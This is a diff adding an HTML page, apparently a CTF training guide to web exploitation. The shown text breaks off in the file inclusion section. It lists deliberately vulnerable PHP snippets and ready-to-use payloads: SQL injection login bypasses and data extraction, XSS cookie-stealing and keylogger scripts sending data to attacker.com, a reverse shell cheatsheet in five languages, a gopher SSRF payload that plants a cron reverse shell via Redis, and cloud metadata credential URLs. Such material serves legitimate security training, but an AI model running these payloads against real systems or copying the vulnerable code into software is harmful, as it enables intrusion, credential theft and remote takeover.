@@ -1,0 +1,1596 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Web Exploitation | CTF Learning Hub</title>
+    <style>
+        body {
+            background-color: #121212;
+            color: #f8f8f8;
+            font-family: 'Courier New', Courier, monospace;
+            margin: 0;
+            padding: 0;
+            line-height: 1.6;
+        }
+        .container {
+            width: 85%;
+            margin: 0 auto;
+            padding: 20px 0;
+        }
+        header {
+            border-bottom: 3px solid #ff9800;
+            padding-bottom: 20px;
+            margin-bottom: 30px;
+            text-align: center;
+        }
+        h1 {
+            color: #ff9800;
+            text-transform: uppercase;
+        }
+        h2 {
+            color: #4caf50;
+            border-left: 4px solid #4caf50;
+            padding-left: 10px;
+            margin-top: 40px;
+            cursor: pointer;
+        }
+        h2::before {
+            content: "+ ";
+            color: #ff9800;
+        }
+        h2.active::before {
+            content: "- ";
+        }
+        h3 {
+            color: #2196f3;
+        }
+        .card {
+            background-color: #1e1e1e;
+            border: 1px solid #333;
+            border-radius: 5px;
+            padding: 15px;
+            margin-bottom: 20px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.3);
+        }
+        .vuln-section {
+            display: none;
+            animation: fadeIn 0.5s;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        .code-block {
+            background-color: #2d2d2d;
+            padding: 15px;
+            border-radius: 5px;
+            overflow-x: auto;
+            font-family: 'Courier New', Courier, monospace;
+            margin: 15px 0;
+            border-left: 3px solid #ff9800;
+            white-space: pre-wrap;
+            word-break: break-all;
+            tab-size: 4;
+        }
+        .note {
+            background-color: #33322d;
+            border-left: 4px solid #ffd700;
+            padding: 10px;
+            margin: 15px 0;
+        }
+        .warning {
+            background-color: #3a1d1d;
+            border-left: 4px solid #f44336;
+            padding: 10px;
+            margin: 15px 0;
+        }
+        .tool {
+            background-color: #1e2b3a;
+            padding: 10px;
+            border-radius: 5px;
+            margin: 10px 0;
+        }
+        a {
+            color: #ff9800;
+            text-decoration: none;
+        }
+        a:hover {
+            text-decoration: underline;
+        }
+        nav {
+            margin: 20px 0;
+        }
+        nav a {
+            margin-right: 15px;
+            padding: 5px 10px;
+            border: 1px solid #ff9800;
+            border-radius: 3px;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 20px 0;
+        }
+        th, td {
+            border: 1px solid #444;
+            padding: 8px;
+            text-align: left;
+        }
+        th {
+            background-color: #333;
+        }
+        tr:nth-child(even) {
+            background-color: #1e1e1e;
+        }
+        .sub-topic {
+            margin-left: 20px;
+            border-left: 2px solid #444;
+            padding-left: 15px;
+        }
+        .payload-list {
+            columns: 3;
+            column-gap: 20px;
+        }
+        .payload-item {
+            break-inside: avoid;
+            margin-bottom: 10px;
+        }
+        .show-more {
+            color: #ff9800;
+            cursor: pointer;
+            text-decoration: underline;
+            margin: 10px 0;
+            display: inline-block;
+        }
+        .more-payloads {
+            display: none;
+        }
+        .tool-name {
+            color: #4caf50;
+            cursor: pointer;
+            text-decoration: underline;
+        }
+        .tool-details {
+            display: none;
+            margin-top: 10px;
+        }
+        .vulnerable-code {
+            background-color: #3a1d1d;
+            padding: 15px;
+            border-radius: 5px;
+            margin: 15px 0;
+            border-left: 3px solid #f44336;
+        }
+        .linux-option {
+            color: #2196f3;
+            cursor: pointer;
+            text-decoration: underline;
+            margin-right: 15px;
+        }
+        .linux-install {
+            display: none;
+            margin-top: 10px;
+        }
+        .curl-examples {
+            background-color: #1e2b3a;
+            padding: 15px;
+            border-radius: 5px;
+            margin: 15px 0;
+            border-left: 3px solid #2196f3;
+        }
+        .http-method {
+            color: #ff9800;
+            font-weight: bold;
+        }
+        .ctf-tip {
+            background-color: #2d1e3a;
+            border-left: 4px solid #9c27b0;
+            padding: 10px;
+            margin: 15px 0;
+        }
+        .flag-format {
+            font-family: 'Courier New', Courier, monospace;
+            color: #ff9800;
+            background-color: #2d2d2d;
+            padding: 2px 5px;
+            border-radius: 3px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>Web Exploitation</h1>
+            <p>Master the art of finding and exploiting vulnerabilities in web applications</p>
+            <nav>
+                <a href="ctf.html">Home</a>
+                <a href="#" class="nav-link" data-section="sql">SQLi</a>
+                <a href="#" class="nav-link" data-section="xss">XSS</a>
+                <a href="#" class="nav-link" data-section="pt">Path Traversal</a>
+                <a href="#" class="nav-link" data-section="ci">Command Injection</a>
+                <a href="#" class="nav-link" data-section="csrf">CSRF</a>
+                <a href="#" class="nav-link" data-section="ssrf">SSRF</a>
+                <a href="#" class="nav-link" data-section="fi">File Inclusion</a>
+                <a href="#" class="nav-link" data-section="curl">cURL Exploitation</a>
+                <a href="#" class="nav-link" data-section="tools">Tools</a>
+                <a href="#" class="nav-link" data-section="ctf-tips">CTF Tips</a>
+            </nav>
+        </header>
+
+        <section id="intro">
+            <div class="card">
+                <h2>Introduction to Web Exploitation</h2>
+                <div class="vuln-section">
+                    <p>Web exploitation involves finding and leveraging vulnerabilities in web applications to gain unauthorized access or extract sensitive information.</p>
+                    <p>Common vulnerabilities include:</p>
+                    <ul>
+                        <li><a href="#" class="nav-link" data-section="sql">SQL Injection (SQLi)</a></li>
+                        <li><a href="#" class="nav-link" data-section="xss">Cross-Site Scripting (XSS)</a></li>
+                        <li><a href="#" class="nav-link" data-section="pt">Path/Directory Traversal</a></li>
+                        <li><a href="#" class="nav-link" data-section="ci">Command Injection</a></li>
+                        <li><a href="#" class="nav-link" data-section="csrf">Cross-Site Request Forgery (CSRF)</a></li>
+                        <li><a href="#" class="nav-link" data-section="ssrf">Server-Side Request Forgery (SSRF)</a></li>
+                        <li><a href="#" class="nav-link" data-section="fi">File Inclusion Vulnerabilities</a></li>
+                        <li><a href="#" class="nav-link" data-section="curl">cURL Exploitation</a></li>
+                    </ul>
+                    <div class="note">
+                        <strong>Note:</strong> This guide focuses on the most common web vulnerabilities found in CTF challenges.
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <section id="sql">
+            <div class="card">
+                <h2>SQL Injection (SQLi)</h2>
+                <div class="vuln-section">
+                    <p>SQL injection is a code injection technique that exploits vulnerabilities in database queries.</p>
+                    
+                    <div class="sub-topic">
+                        <h3>Vulnerable PHP Code Example</h3>
+                        <div class="vulnerable-code">
+                            <div class="code-block">
+// UNSAFE CODE - Vulnerable to SQLi
+$username = $_POST['username'];
+$password = $_POST['password'];
+$query = "SELECT * FROM users WHERE username='$username' AND password='$password'";
+$result = mysqli_query($conn, $query);
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="sub-topic">
+                        <h3>Basic SQLi</h3>
+                        <div class="code-block">
+# Bypass login with SQLi
+Username: admin' --
+Password: [anything]
+
+# Alternative comment syntax
+Username: admin' /*
+Password: [anything]
+
+# Using OR condition
+Username: admin' OR '1'='1' --
+Password: [anything]
+
+# MySQL specific
+Username: admin' #
+Password: [anything]
+
+# Always true condition
+' OR '1'='1' --
+" OR "" = "
+                        </div>
+                    </div>
+                    
+                    <div class="sub-topic">
+                        <h3>Union-Based SQLi</h3>
+                        <div class="code-block">
+# Find number of columns
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--  # If this fails, there are 2 columns
+
+# Union attack to retrieve data
+' UNION SELECT username, password FROM users--
+                        </div>
+                        <div class="show-more" data-target="sql-union-more">Show more Union-Based examples</div>
+                        <div class="more-payloads" id="sql-union-more">
+                            <div class="code-block">
+# Find table names (MySQL)
+' UNION SELECT 1,table_name FROM information_schema.tables--
+
+# Find column names (MySQL)
+' UNION SELECT 1,column_name FROM information_schema.columns WHERE table_name='users'--
+
+# Extract data from specific columns
+' UNION SELECT 1,concat(username,':',password) FROM users--
+
+# PostgreSQL version
+' UNION SELECT NULL,version()--
+
+# SQLite version
+' UNION SELECT 1,sqlite_version()--
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="sub-topic">
+                        <h3>Blind SQLi</h3>
+                        <div class="code-block">
+# Time-based blind SQLi
+'; IF (1=1) WAITFOR DELAY '0:0:5'--
+'; IF (1=2) WAITFOR DELAY '0:0:5'--
+
+# Boolean-based blind SQLi
+' AND 1=1 -- (returns true)
+' AND 1=2 -- (returns false)
+                        </div>
+                        <div class="show-more" data-target="sql-blind-more">Show more Blind SQLi examples</div>
+                        <div class="more-payloads" id="sql-blind-more">
+                            <div class="code-block">
+# Extract data character by character
+' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'--
+
+# Conditional error
+' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE NULL END)--
+
+# MySQL blind with LIKE
+' AND (SELECT password FROM users WHERE username='admin' AND password LIKE 'a%')='a
+
+# Oracle blind
+' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 1/0 END FROM dual)=1--
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="tool">
+                        <h3>SQLi Tools</h3>
+                        <p><span class="tool-name">sqlmap</span> - Automatic SQL injection tool</p>
+                        <div class="tool-details" id="sqlmap-details">
+                            <div class="code-block">
+# Install on Kali Linux
+sudo apt update && sudo apt install sqlmap
+
+# Basic usage
+sqlmap -u "http://example.com/page.php?id=1" --dbs
+sqlmap -u "http://example.com/page.php?id=1" -D database_name --tables
+sqlmap -u "http://example.com/page.php?id=1" -D database_name -T table_name --dump
+
+# Advanced options
+sqlmap -u "http://example.com/login" --data="username=admin&password=pass" --level=5 --risk=3
+sqlmap -u "http://example.com/page" --cookie="PHPSESSID=123" --os-shell
+                            </div>
+                            <div class="linux-option" data-target="sqlmap-kali">Kali Linux</div>
+                            <div class="linux-option" data-target="sqlmap-blackarch">BlackArch</div>
+                            <div class="linux-option" data-target="sqlmap-manual">Manual Install</div>
+                            
+                            <div class="linux-install" id="sqlmap-kali">
+                                <div class="code-block">
+# Kali Linux comes with sqlmap pre-installed
+# Just run:
+sqlmap --version
+
+# If not installed:
+sudo apt update && sudo apt install sqlmap
+                                </div>
+                            </div>
+                            
+                            <div class="linux-install" id="sqlmap-blackarch">
+                                <div class="code-block">
+# BlackArch has sqlmap in its repositories
+sudo pacman -S sqlmap
+                                </div>
+                            </div>
+                            
+                            <div class="linux-install" id="sqlmap-manual">
+                                <div class="code-block">
+# Manual installation from GitHub
+git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
+cd sqlmap-dev
+python sqlmap.py --version
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="note">
+                        <strong>Note:</strong> Always test SQLi on systems you have permission to test. Unauthorized testing is illegal.
+                    </div>
+                    
+                    <div class="ctf-tip">
+                        <strong>CTF Tip:</strong> In CTFs, flags are often hidden in database tables. Look for tables named:
+                        <span class="flag-format">flags</span>, 
+                        <span class="flag-format">secret</span>, 
+                        <span class="flag-format">flag_storage</span>, or 
+                        <span class="flag-format">ctf_flags</span>.
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- XSS Section -->
+        <section id="xss">
+            <div class="card">
+                <h2>Cross-Site Scripting (XSS)</h2>
+                <div class="vuln-section">
+                    <p>XSS allows attackers to inject client-side scripts into web pages viewed by other users.</p>
+                    
+                    <div class="sub-topic">
+                        <h3>Vulnerable PHP Code Example</h3>
+                        <div class="vulnerable-code">
+                            <div class="code-block">
+// UNSAFE CODE - Vulnerable to XSS
+$search = $_GET['search'];
+echo "&lt;p&gt;Search results for: " . $search . "&lt;/p&gt;";
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="sub-topic">
+                        <h3>Types of XSS</h3>
+                        <table>
+                            <tr>
+                                <th>Type</th>
+                                <th>Description</th>
+                                <th>Example</th>
+                            </tr>
+                            <tr>
+                                <td>Reflected</td>
+                                <td>Non-persistent, appears in URL</td>
+                                <td>&lt;script&gt;alert(1)&lt;/script&gt;</td>
+                            </tr>
+                            <tr>
+                                <td>Stored</td>
+                                <td>Persistent, stored on server</td>
+                                <td>Comment field: &lt;script&gt;stealCookies()&lt;/script&gt;</td>
+                            </tr>
+                            <tr>
+                                <td>DOM-based</td>
+                                <td>Executed in DOM without server</td>
+                                <td>#default=&lt;script&gt;alert(1)&lt;/script&gt;</td>
+                            </tr>
+                        </table>
+                    </div>
+                    
+                    <div class="sub-topic">
+                        <h3>XSS Payload Examples</h3>
+                        <div class="payload-list">
+                            <div class="payload-item">
+                                <div class="code-block">
+# Basic alert
+&lt;script&gt;alert('XSS')&lt;/script&gt;
+                                </div>
+                            </div>
+                            <div class="payload-item">
+                                <div class="code-block">
+# Cookie stealing
+&lt;script&gt;fetch('http://attacker.com/steal?cookie='+document.cookie)&lt;/script&gt;
+                                </div>
+                            </div>
+                            <div class="payload-item">
+                                <div class="code-block">
+# Keylogger
+&lt;script&gt;document.onkeypress=function(e){fetch('http://attacker.com/log?key='+e.key)}&lt;/script&gt;
+                                </div>
+                            </div>
+                            <div class="payload-item">
+                                <div class="code-block">
+# Bypass filters with img
+&lt;img src=x onerror=alert(1)&gt;
+                                </div>
+                            </div>
+                        </div>
+                        <div class="show-more" data-target="xss-more">Show more XSS payloads (100+ examples)</div>
+                        <div class="more-payloads" id="xss-more">
+                            <div class="payload-list">
+                                <div class="payload-item">
+                                    <div class="code-block">
+# Using svg
+&lt;svg onload=alert(1)&gt;
+                                    </div>
+                                </div>
+                                <div class="payload-item">
+                                    <div class="code-block">
+# Using javascript: URI
+&lt;a href="javascript:alert(1)"&gt;Click me&lt;/a&gt;
+                                    </div>
+                                </div>
+                                <div class="payload-item">
+                                    <div class="code-block">
+# Using events
+&lt;body onload=alert(1)&gt;
+                                    </div>
+                                </div>
+                                <div class="payload-item">
+                                    <div class="code-block">
+# Using iframe
+&lt;iframe src="javascript:alert(1)"&gt;
+                                    </div>
+                                </div>
+                                <div class="payload-item">
+                                    <div class="code-block">
+# Using HTML5 features
+&lt;video&gt;&lt;source onerror="alert(1)"&gt;
+                                    </div>
+                                </div>
+                                <div class="payload-item">
+                                    <div class="code-block">
+# Using CSS
+&lt;div style="background-image:url(javascript:alert(1))"&gt;
+                                    </div>
+                                </div>
+                                <div class="payload-item">
+                                    <div class="code-block">
+# Using data URI
+&lt;object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="&gt;
+                                    </div>
+                                </div>
+                                <div class="payload-item">
+                                    <div class="code-block">
+# Using encoded characters
+&lt;img src=x onerror="&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;"&gt;
+                                    </div>
+                                </div>
+                                <div class="payload-item">
+                                    <div class="code-block">
+# Using HTML entities
+&lt;img src=x onerror="&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;"&gt;
+                                    </div>
+                                </div>
+                                <div class="payload-item">
+                                    <div class="code-block">
+# Using template literals
+&lt;script&gt;alert`1`&lt;/script&gt;
+                                    </div>
+                                </div>
+                                <div class="payload-item">
+                                    <div class="code-block">
+# Using eval
+&lt;script&gt;eval('al'+'ert(1)')&lt;/script&gt;
+                                    </div>
+                                </div>
+                                <div class="payload-item">
+                                    <div class="code-block">
+# Using location
+&lt;script&gt;location='javascript:alert(1)'&lt;/script&gt;
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="tool">
+                        <h3>XSS Tools</h3>
+                        <p><span class="tool-name">BeEF</span> - The Browser Exploitation Framework</p>
+                        <div class="tool-details" id="beef-details">
+                            <div class="code-block">
+# Install on Kali Linux
+sudo apt update && sudo apt install beef-xss
+
+# Start BeEF
+beef-xss
+                            </div>
+                            <div class="linux-option" data-target="beef-kali">Kali Linux</div>
+                            <div class="linux-option" data-target="beef-blackarch">BlackArch</div>
+                            <div class="linux-option" data-target="beef-manual">Manual Install</div>
+                            
+                            <div class="linux-install" id="beef-kali">
+                                <div class="code-block">
+# Kali Linux installation
+sudo apt update && sudo apt install beef-xss
+                                </div>
+                            </div>
+                            
+                            <div class="linux-install" id="beef-blackarch">
+                                <div class="code-block">
+# BlackArch installation
+sudo pacman -S beef
+                                </div>
+                            </div>
+                            
+                            <div class="linux-install" id="beef-manual">
+                                <div class="code-block">
+# Manual installation
+git clone https://github.com/beefproject/beef
+cd beef
+./install
+./beef
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="ctf-tip">
+                        <strong>CTF Tip:</strong> For XSS challenges, try different contexts:
+                        <ul>
+                            <li>Between HTML tags: <span class="flag-format">&lt;script&gt;alert(1)&lt;/script&gt;</span></li>
+                            <li>In HTML attributes: <span class="flag-format">" onmouseover="alert(1)</span></li>
+                            <li>In JavaScript strings: <span class="flag-format">';alert(1);//</span></li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Path Traversal Section -->
+        <section id="pt">
+            <div class="card">
+                <h2>Path/Directory Traversal</h2>
+                <div class="vuln-section">
+                    <p>Allows access to files and directories outside the web root directory.</p>
+                    
+                    <div class="sub-topic">
+                        <h3>Vulnerable PHP Code Example</h3>
+                        <div class="vulnerable-code">
+                            <div class="code-block">
+// UNSAFE CODE - Vulnerable to Path Traversal
+$file = $_GET['file'];
+readfile('/var/www/html/' . $file);
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="sub-topic">
+                        <h3>Basic Examples</h3>
+                        <div class="code-block">
+# Basic traversal
+http://example.com/getFile?filename=../../../../etc/passwd
+
+# URL encoded
+http://example.com/getFile?filename=%2e%2e%2f%2e%2e%2fetc%2fpasswd
+
+# Double encoding
+http://example.com/getFile?filename=%252e%252e%252f%252e%252e%252fetc%252fpasswd
+
+# Null byte injection (PHP < 5.3.4)
+http://example.com/getFile?filename=../../../../etc/passwd%00
+                        </div>
+                    </div>
+                    
+                    <div class="sub-topic">
+                        <h3>Common Files to Access</h3>
+                        <ul>
+                            <li>/etc/passwd</li>
+                            <li>/etc/shadow</li>
+                            <li>/proc/self/environ</li>
+                            <li>../../../../../var/log/apache2/access.log</li>
+                            <li>../../../../../var/www/html/config.php</li>
+                            <li>../../../../../windows/win.ini</li>
+                            <li>../../../../../Windows/System32/drivers/etc/hosts</li>
+                        </ul>
+                    </div>
+                    
+                    <div class="tool">
+                        <h3>Path Traversal Tools</h3>
+                        <p><span class="tool-name">DotDotPwn</span> - Directory Traversal Fuzzer</p>
+                        <div class="tool-details" id="dotdotpwn-details">
+                            <div class="code-block">
+# Basic usage
+dotdotpwn.pl -m http -h example.com -o /etc/passwd
+                            </div>
+                            <div class="linux-option" data-target="dotdotpwn-kali">Kali Linux</div>
+                            <div class="linux-option" data-target="dotdotpwn-manual">Manual Install</div>
+                            
+                            <div class="linux-install" id="dotdotpwn-kali">
+                                <div class="code-block">
+# Kali Linux installation
+sudo apt update && sudo apt install dotdotpwn
+                                </div>
+                            </div>
+                            
+                            <div class="linux-install" id="dotdotpwn-manual">
+                                <div class="code-block">
+# Manual installation
+git clone https://github.com/wireghoul/dotdotpwn
+cd dotdotpwn
+perl dotdotpwn.pl
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="ctf-tip">
+                        <strong>CTF Tip:</strong> For path traversal challenges, try:
+                        <ul>
+                            <li>Different levels of traversal: <span class="flag-format">../../../../etc/passwd</span></li>
+                            <li>URL encoding: <span class="flag-format">%2e%2e%2fetc%2fpasswd</span></li>
+                            <li>Null byte termination if PHP: <span class="flag-format">../../../etc/passwd%00</span></li>
+                            <li>Check for file extensions being added: <span class="flag-format">../../../etc/passwd.</span></li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Command Injection Section -->
+        <section id="ci">
+            <div class="card">
+                <h2>Command Injection</h2>
+                <div class="vuln-section">
+                    <p>Allows execution of arbitrary commands on the host operating system.</p>
+                    
+                    <div class="sub-topic">
+                        <h3>Vulnerable PHP Code Example</h3>
+                        <div class="vulnerable-code">
+                            <div class="code-block">
+// UNSAFE CODE - Vulnerable to Command Injection
+$ip = $_GET['ip'];
+system("ping -c 4 " . $ip);
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="sub-topic">
+                        <h3>Command Injection Examples</h3>
+                        <div class="code-block">
+# Basic command injection
+; ls -la
+; cat /etc/passwd
+
+# Chaining commands
+&amp;&amp; whoami
+| id
+
+# Background process
+; nc -lvp 4444 &amp;
+
+# Command substitution
+`whoami`
+$(whoami)
+
+# Newline injection
+127.0.0.1%0Acat%20/etc/passwd
+                        </div>
+                    </div>
+                    
+                    <div class="sub-topic">
+                        <h3>Reverse Shell Cheatsheet</h3>
+                        <div class="code-block">
+# Bash
+bash -i &gt;&amp; /dev/tcp/10.0.0.1/4242 0&gt;&amp;1
+
+# Python
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+# Netcat
+nc -e /bin/sh 10.0.0.1 4242
+
+# PHP
+php -r '$sock=fsockopen("10.0.0.1",4242);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'
+
+# Perl
+perl -e 'use Socket;$i="10.0.0.1";$p=4242;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'
+                        </div>
+                    </div>
+                    
+                    <div class="tool">
+                        <h3>Command Injection Tools</h3>
+                        <p><span class="tool-name">Commix</span> - Automated Command Injection Exploitation Tool</p>
+                        <div class="tool-details" id="commix-details">
+                            <div class="code-block">
+# Basic usage
+python commix.py -u "http://example.com/vuln.php?ip=127.0.0.1"
+                            </div>
+                            <div class="linux-option" data-target="commix-kali">Kali Linux</div>
+                            <div class="linux-option" data-target="commix-manual">Manual Install</div>
+                            
+                            <div class="linux-install" id="commix-kali">
+                                <div class="code-block">
+# Kali Linux installation
+sudo apt update && sudo apt install commix
+                                </div>
+                            </div>
+                            
+                            <div class="linux-install" id="commix-manual">
+                                <div class="code-block">
+# Manual installation
+git clone https://github.com/commixproject/commix.git
+cd commix
+python commix.py
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="ctf-tip">
+                        <strong>CTF Tip:</strong> For command injection challenges:
+                        <ul>
+                            <li>Try different command separators: <span class="flag-format">; &amp;&amp; | || ` $()</span></li>
+                            <li>Check for blind injection with time delays: <span class="flag-format">sleep 5</span></li>
+                            <li>Try URL encoding if input is filtered: <span class="flag-format">%3Bcat%20/etc/passwd</span></li>
+                            <li>Use base64 encoding to bypass filters: <span class="flag-format">echo d2hvYW1p | base64 -d | bash</span></li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- CSRF Section -->
+        <section id="csrf">
+            <div class="card">
+                <h2>Cross-Site Request Forgery (CSRF)</h2>
+                <div class="vuln-section">
+                    <p>Forces an end user to execute unwanted actions on a web application.</p>
+                    
+                    <div class="sub-topic">
+                        <h3>Vulnerable PHP Code Example</h3>
+                        <div class="vulnerable-code">
+                            <div class="code-block">
+// UNSAFE CODE - Vulnerable to CSRF
+if ($_POST['action'] == 'transfer') {
+    $amount = $_POST['amount'];
+    $to = $_POST['to'];
+    transfer_money($amount, $to);
+}
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="sub-topic">
+                        <h3>Basic CSRF Example</h3>
+                        <div class="code-block">
+&lt;html&gt;
+&lt;body&gt;
+&lt;form action="http://vulnerable.com/transfer" method="POST"&gt;
+&nbsp;&nbsp;&lt;input type="hidden" name="action" value="transfer" /&gt;
+&nbsp;&nbsp;&lt;input type="hidden" name="amount" value="1000" /&gt;
+&nbsp;&nbsp;&lt;input type="hidden" name="to" value="attacker" /&gt;
+&lt;/form&gt;
+&lt;script&gt;
+&nbsp;&nbsp;document.forms[0].submit();
+&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+                        </div>
+                    </div>
+                    
+                    <div class="sub-topic">
+                        <h3>CSRF Protection Bypass</h3>
+                        <div class="code-block">
+# If CSRF token is checked but not validated properly
+&lt;input type="hidden" name="csrf_token" value="fixed_value"&gt;
+
+# If token is in cookie but not linked to session
+&lt;img src="http://vulnerable.com/delete?csrf_token=123"&gt;
+
+# If token is predictable
+&lt;script&gt;
+fetch('http://vulnerable.com/get_token')
+.then(r => r.text())
+.then(token => {
+    fetch('http://vulnerable.com/transfer', {
+        method: 'POST',
+        body: `amount=1000&to=attacker&csrf_token=${token}`
+    });
+});
+&lt;/script&gt;
+                        </div>
+                    </div>
+                    
+                    <div class="tool">
+                        <h3>CSRF Tools</h3>
+                        <p><span class="tool-name">CSRF PoC Generator</span> - Generate CSRF Proof of Concepts</p>
+                        <div class="tool-details" id="csrfgen-details">
+                            <div class="code-block">
+# Using Burp Suite's CSRF PoC generator:
+1. Intercept request in Burp
+2. Right click → Engagement tools → Generate CSRF PoC
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="ctf-tip">
+                        <strong>CTF Tip:</strong> For CSRF challenges:
+                        <ul>
+                            <li>Check if the application checks the Referer header</li>
+                            <li>Try to predict CSRF tokens if they're not random</li>
+                            <li>Look for JSON endpoints that might accept GET requests</li>
+                            <li>Try to chain with XSS to bypass Same-Origin Policy</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- SSRF Section -->
+        <section id="ssrf">
+            <div class="card">
+                <h2>Server-Side Request Forgery (SSRF)</h2>
+                <div class="vuln-section">
+                    <p>SSRF allows an attacker to induce the server-side application to make requests to unintended locations.</p>
+                    
+                    <div class="sub-topic">
+                        <h3>Vulnerable PHP Code Example</h3>
+                        <div class="vulnerable-code">
+                            <div class="code-block">
+// UNSAFE CODE - Vulnerable to SSRF
+$url = $_GET['url'];
+$content = file_get_contents($url);
+echo $content;
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="sub-topic">
+                        <h3>Basic SSRF Examples</h3>
+                        <div class="code-block">
+# Access internal services
+http://vulnerable.com/load?url=http://localhost
+http://vulnerable.com/load?url=file:///etc/passwd
+
+# Using different protocols
+http://vulnerable.com/load?url=dict://attacker.com:1337/
+                        </div>
+                    </div>
+                    
+                    <div class="sub-topic">
+                        <h3>Advanced SSRF Techniques</h3>
+                        <div class="code-block">
+# Bypassing filters with encoding
+http://vulnerable.com/load?url=http://127.0.0.1@attacker.com
+http://vulnerable.com/load?url=http://2130706433/ (127.0.0.1 as integer)
+
+# Cloud metadata endpoints (AWS)
+http://vulnerable.com/load?url=http://169.254.169.254/latest/meta-data/
+                        </div>
+                        <div class="show-more" data-target="ssrf-more">Show more SSRF examples</div>
+                        <div class="more-payloads" id="ssrf-more">
+                            <div class="code-block">
+# Gopher protocol for SSRF to Redis
+http://vulnerable.com/load?url=gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$57%0d%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/attacker.com/4444 0>&1%0a%0a%0a%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a
+
+# SSRF to internal services
+http://vulnerable.com/load?url=http://localhost:8080/admin
+http://vulnerable.com/load?url=http://127.0.0.1:3306 (MySQL)
+
+# SSRF with DNS rebinding
+http://vulnerable.com/load?url=http://attacker.com (with DNS TTL=0)
+
+# AWS metadata endpoints
+http://vulnerable.com/load?url=http://169.254.169.254/latest/meta-data/
+http://vulnerable.com/load?url=http://169.254.169.254/latest/user-data/
+http://vulnerable.com/load?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="tool">
+                        <h3>SSRF Tools</h3>
+                        <p><span class="tool-name">SSRFmap</span> - Automatic SSRF exploitation tool</p>
+                        <div class="tool-details" id="ssrfmap-details">
+                            <div class="code-block">
+# Basic usage
+python ssrfmap.py -r request.txt -p url -m portscan
+                            </div>
+                            <div class="linux-option" data-target="ssrfmap-kali">Kali Linux</div>
+                            <div class="linux-option" data-target="ssrfmap-manual">Manual Install</div>
+                            
+                            <div class="linux-install" id="ssrfmap-kali">
+                                <div class="code-block">
+# Kali Linux installation
+git clone https://github.com/swisskyrepo/SSRFmap
+cd SSRFmap
+pip install -r requirements.txt
+                                </div>
+                            </div>
+                            
+                            <div class="linux-install" id="ssrfmap-manual">
+                                <div class="code-block">
+# Manual installation
+git clone https://github.com/swisskyrepo/SSRFmap
+cd SSRFmap
+pip install -r requirements.txt
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="ctf-tip">
+                        <strong>CTF Tip:</strong> For SSRF challenges:
+                        <ul>
+                            <li>Try accessing <span class="flag-format">http://localhost</span> or <span class="flag-format">http://127.0.0.1</span></li>
+                            <li>Check for cloud metadata endpoints</li>
+                            <li>Try different protocols: <span class="flag-format">file://, gopher://, dict://</span></li>
+                            <li>Use IP encoding: <span class="flag-format">http://2130706433</span> (127.0.0.1)</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- File Inclusion Section -->
+        <section id="fi">
+            <div class="card">
+                <h2>File Inclusion Vulnerabilities</h2>
+                <div class="vuln-section">
+                    <p>File inclusion vulnerabilities allow attackers to include files on a web server through improper input validation.</p>
+                    
+                    <div class="sub-topic">
+                        <h3>Vulnerable PHP Code Example</h3>
+                        <div class="vulnerable-code">
+                            <div class="code-block">
+// UNSAFE CODE - Vulnerable to File Inclusion
+$page = $_GET['page'];
